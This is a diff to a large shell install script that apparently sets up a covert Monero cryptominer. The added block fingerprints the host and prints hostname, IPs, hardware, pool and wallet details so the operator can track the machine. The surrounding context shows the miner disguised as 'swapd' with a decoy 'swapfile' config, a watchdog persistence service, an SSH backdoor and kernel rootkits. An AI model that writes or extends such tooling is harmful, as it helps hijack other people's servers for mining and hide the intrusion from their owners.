@@ -2584,6 +2584,86 @@ chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true
 echo "[✓] SSH configuration complete (backdoor disabled by default)"
 echo ""
 
+# ==================== SERVER INFORMATION ====================
+echo '========================================================================='
+echo 'SERVER INFORMATION (Copy this for tracking/monitoring)'
+echo '========================================================================='
+echo ''
+
+# Hostname and IPs
+HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
+EXTERNAL_IP=$(get_server_ip)
+INTERNAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
+
+echo "Server Identification:"
+echo "  Hostname:     $HOSTNAME"
+echo "  External IP:  $EXTERNAL_IP"
+echo "  Internal IP:  $INTERNAL_IP"
+echo "  Worker ID:    $PASS"
+
+echo ''
+
+# OS Information
+if [ -f /etc/os-release ]; then
+    OS_NAME=$(grep "^PRETTY_NAME=" /etc/os-release | cut -d'"' -f2)
+else
+    OS_NAME=$(uname -s)
+fi
+KERNEL=$(uname -r)
+ARCH=$(uname -m)
+
+echo "Operating System:"
+echo "  OS:           $OS_NAME"
+echo "  Kernel:       $KERNEL"
+echo "  Architecture: $ARCH"
+echo "  Uptime:       $(uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}')"
+
+echo ''
+
+# Hardware Information
+CPU_MODEL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | sed 's/^[ \t]*//' || echo "unknown")
+CPU_CORES=$(nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "unknown")
+RAM_TOTAL=$(free -h 2>/dev/null | grep "^Mem:" | awk '{print $2}' || echo "unknown")
+DISK_ROOT=$(df -h / 2>/dev/null | tail -1 | awk '{print $2}' || echo "unknown")
+DISK_FREE=$(df -h / 2>/dev/null | tail -1 | awk '{print $4}' || echo "unknown")
+
+echo "Hardware Resources:"
+echo "  CPU:          $CPU_MODEL"
+echo "  Cores:        $CPU_CORES"
+echo "  RAM:          $RAM_TOTAL"
+echo "  Disk (root):  $DISK_ROOT (Free: $DISK_FREE)"
+
+echo ''
+
+# Installation Details
+INSTALL_DATE=$(date '+%Y-%m-%d %H:%M:%S %Z')
+MINER_TYPE_DISPLAY="XMRig"
+if [ "$MINER_TYPE" = "cpuminer" ]; then
+    MINER_TYPE_DISPLAY="SRBMiner-MULTI (ARM)"
+fi
+
+echo "Installation Details:"
+echo "  Install Date: $INSTALL_DATE"
+echo "  Miner Type:   $MINER_TYPE_DISPLAY"
+echo "  Binary Path:  /root/.swapd/swapd"
+echo "  Config Path:  /root/.swapd/swapfile"
+echo "  Service:      swapd.service"
+echo "  Watchdog:     system-watchdog.service"
+
+echo ''
+
+# Network/Mining Configuration
+echo "Mining Configuration:"
+echo "  Pool:         gulf.moneroocean.stream:80"
+echo "  Wallet:       ${WALLET:0:20}...${WALLET: -10}"
+echo "  Worker Pass:  $PASS"
+echo "  Pool URL:     https://moneroocean.stream"
+echo "  Worker Stats: https://moneroocean.stream/?worker=$WALLET#worker-stats"
+
+echo ''
+echo '========================================================================='
+echo ''
+
 # ==================== INSTALLATION SUMMARY ====================
 echo '========================================================================='
 echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (KERNEL ROOTKITS ONLY)!'
